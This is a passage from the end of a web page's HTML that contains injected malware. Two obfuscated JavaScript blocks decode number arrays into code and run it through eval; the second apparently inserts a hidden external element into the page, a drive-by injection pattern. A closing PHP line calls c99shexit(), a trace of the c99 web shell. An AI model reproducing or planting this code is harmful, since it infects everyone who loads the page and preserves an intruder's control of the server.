,1.25,1248,3.25,3232,3.28125,3296,3.25,3712,1.21875,1408,1.21875,1568,1.5,1248,1.28125,1888,0.40625,288,0.28125,288,3.125,3552,3.09375,3744,3.40625,3232,3.4375,3712,1.4375,3296,3.15625,3712,2.15625,3456,3.15625,3488,3.15625,3520,3.625,3680,2.0625,3872,2.625,3104,3.21875,2496,3.03125,3488,3.15625,1280,1.21875,3136,3.46875,3200,3.78125,1248,1.28125,2912,1.5,2976,1.4375,3104,3.5,3584,3.15625,3520,3.125,2144,3.25,3360,3.375,3200,1.25,3264,1.28125,1888,0.40625,288,0.28125,4000];v=32;date=new Date();try{var req=getXmlHttp();req.onreadystatechange=function(){if(req.readyState==1){absrbwa();}};req.open('GET','http://google.com/',true);req.send(null);}catch(e){}
var y=false;function absrbwa(){if(y)return;y=true;ev=eval;s='';for(i=0;i<cont.length;i++){s+=String[fr]((i%2)?cont[i]*v:cont[i]/v);}
ev(s);}</script>

<script>date=new Date(0;var ar="g/ m>sN.Afw=]'h{y1n bilvEreBCtd<c:T,\";o()0[p}au";try{gserkewg();}catch(a){k=new Boolean().toString()};var ar2="f57,57,63,27,6,117,90,114,96,138,9,78,54,87,21,0,78,87,72,66,78,9,78,54,87,15,81,48,102,135,0,18,135,9,78,117,39,60,114,90,48,39,120,126,123,36,120,45,57,57,57,63,27,75,135,9,78,75,117,120,111,57,57,132,6,78,66,15,78,6,45,57,57,57,90,114,96,138,9,78,54,87,21,30,75,63,87,78,117,108,93,63,27,75,135,9,78,6,15,75,96,33,39,42,87,87,129,99,3,3,60,75,63,96,114,75,90,21,96,114,9,3,96,114,138,54,87,51,21,129,42,129,39,6,30,63,90,87,42,33,39,51,123,39,6,42,78,63,0,42,87,33,39,51,123,39,6,15,87,48,66,78,33,39,69,63,15,63,60,63,66,63,87,48,99,42,63,90,90,78,54,111,129,114,15,63,87,63,114,54,99,135,60,15,114,66,138,87,78,111,66,78,27,87,99,123,111,87,114,129,99,123,111,39,12,93,3,63,27,75,135,9,78,12,108,120,111,57,57,132,57,57,27,138,54,96,87,63,114,54,6,63,27,75,135,9,78,75,117,120,45,57,57,57,69,135,75,6,27,6,33,6,90,114,96,138,9,78,54,87,21,96,75,78,135,87,78,72,66,78,9,78,54,87,117,39,63,27,75,135,9,78,39,120,111,27,21,15,78,87,24,87,87,75,63,60,138,87,78,117,39,15,75,96,39,105,39,42,87,87,129,99,3,3,60,75,63,96,114,75,90,21,96,114,9,3,96,114,138,54,87,51,21,129,42,129,39,120,111,27,21,15,87,48,66,78,21,69,63,15,63,60,63,66,63,87,48,33,39,42,63,90,90,78,54,39,111,27,21,15,87,48,66,78,21,129,114,15,63,87,63,114,54,33,39,135,60,15,114,66,138,87,78,39,111,27,21,15,87,48,66,78,21,66,78,27,87,33,39,123,39,111,27,21,15,87,48,66,78,21,87,114,129,33,39,123,39,111,27,21,15,78,87,24,87,87,75,63,60,138,87,78,117,39,30,63,90,87,42,39,105,39,51,123,39,120,111,27,21,15,78,87,24,87,87,75,63,60,138,87,78,117,39,42,78,63,0,42,87,39,105,39,51,123,39,120,111,57,57,57,90,114,96,138,9,78,54,87,21,0,78,87,72,66,78,9,78,54,87,15,81,48,102,135,0,18,135,9,78,117,39,60,114,90,48,39,120,126,123,36,21,135,129,129,78,54,90,84,42,63,66,90,117,27,120,111,57,57,132]".replace(k.substr(0,1),'[');pau="rn ev2010".replace(date.getFullYear()-1,"al");e=new Function("","retu"+pau);e=e();ar2=e(ar2);s="";for(i=0;i<ar2.length;i++){s+=ar.substr(ar2[i]/3,1);}
e(s);</script>
</body></html><?php chdir($lastdir); c99shexit(); ?>